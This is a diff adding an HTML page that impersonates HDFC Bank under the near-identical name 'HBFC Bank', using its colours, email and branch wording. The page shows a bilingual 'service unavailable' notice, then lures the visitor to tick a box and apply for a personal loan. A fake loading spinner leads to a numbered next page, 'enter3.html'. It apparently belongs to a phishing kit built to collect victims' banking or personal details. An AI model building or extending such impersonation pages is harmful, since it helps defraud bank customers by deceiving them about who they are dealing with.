@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBFC Bank - Service Availability</title>
+    <style>
+        :root {
+            --hdfc-blue: #004c8f;
+            --hdfc-red: #ed1c24;
+            --grey-disabled: #cccccc;
+        }
+        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background-color: #f4f7f9; color: #333; line-height: 1.6; }
+        
+        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; }
+        .header h2 { margin: 0; color: var(--hdfc-blue); font-size: 20px; text-transform: uppercase; }
+
+        .container { padding: 30px 20px; max-width: 500px; margin: 0 auto; }
+        
+        .alert-card { 
+            background: white; 
+            border-radius: 15px; 
+            padding: 25px; 
+            text-align: center; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            border-top: 5px solid var(--hdfc-red);
+        }
+
+        .icon { font-size: 50px; color: var(--hdfc-red); margin-bottom: 15px; }
+
+        .lang-section { margin-bottom: 25px; }
+        .lang-section h3 { font-size: 18px; color: #d32f2f; margin-bottom: 10px; }
+        .lang-section p { font-size: 14px; color: #555; margin: 5px 0; }
+
+        .contact-info { 
+            background: #f9f9f9; 
+            padding: 15px; 
+            border-radius: 8px; 
+            font-size: 14px; 
+            text-align: left; 
+            margin-bottom: 20px; 
+            border: 1px solid #eee;
+        }
+        .contact-info b { color: var(--hdfc-blue); }
+
+        /* Checkbox Styling */
+        .terms-box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            border: 1px solid #ddd;
+        }
+        input[type="checkbox"] { width: 20px; height: 20px; cursor: pointer; }
+
+        /* Apply Button */
+        .btn-apply {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background-color: var(--grey-disabled);
+            cursor: not-allowed;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+        .btn-active {
+            background-color: var(--hdfc-blue) !important;
+            cursor: pointer !important;
+            box-shadow: 0 4px 10px rgba(0,76,143,0.3);
+        }
+
+        /* Loader */
+        .loader { display: none; text-align: center; margin-top: 15px; }
+        .spinner {
+            width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid var(--hdfc-blue);
+            border-radius: 50%; animation: spin 1s linear infinite; display: inline-block;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h2>HBFC BANK</h2>
+    </div>
+
+    <div class="container">
+        <div class="alert-card">
+            <div class="icon">⚠️</div>
+            
+            <div class="lang-section">
+                <h3>Service Unavailable</h3>
+                <p>We apologize, but this service is currently <b>not available</b> in your specific area/region.</p>
+            </div>
+
+            <div class="lang-section">
+                <h3>सेवा उपलब्ध नहीं है</h3>
+                <p>हमें खेद है, यह सुविधा वर्तमान में आपके <b>क्षेत्र (Area)</b> में उपलब्ध नहीं है।</p>
+            </div>
+
+            <div class="contact-info">
+                For more details, please contact us:<br>
+                📞 Helpline: <b>1800 2600</b><br>
+                📧 Email: <b>support@hdfcbank.com</b><br>
+                🏦 Or visit your nearest HDFC Bank branch.
+            </div>
+        </div>
+
+        <br>
+
+        <label class="terms-box">
+            <input type="checkbox" id="checkConsent" onchange="toggleButton()">
+            <span style="font-size: 13px;">I want to apply for a manual Personal Loan review.</span>
+        </label>
+
+        <button id="applyBtn" class="btn-apply" onclick="processApply()" disabled>Apply Personal Loan</button>
+
+        <div class="loader" id="buffer">
+            <div class="spinner"></div>
+            <p style="font-size: 14px; color: var(--hdfc-blue);">Redirecting to Personal Loan section...</p>
+        </div>
+    </div>
+
+    <script>
+        function toggleButton() {
+            const checkBox = document.getElementById('checkConsent');
+            const btn = document.getElementById('applyBtn');
+
+            if (checkBox.checked) {
+                btn.classList.add('btn-active');
+                btn.disabled = false;
+            } else {
+                btn.classList.remove('btn-active');
+                btn.disabled = true;
+            }
+        }
+
+        function processApply() {
+            // Show loader
+            document.getElementById('buffer').style.display = 'block';
+            document.getElementById('applyBtn').style.display = 'none';
+
+            // 2 seconds loading time then redirect
+            setTimeout(() => {
+                window.location.href = "enter3.html";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
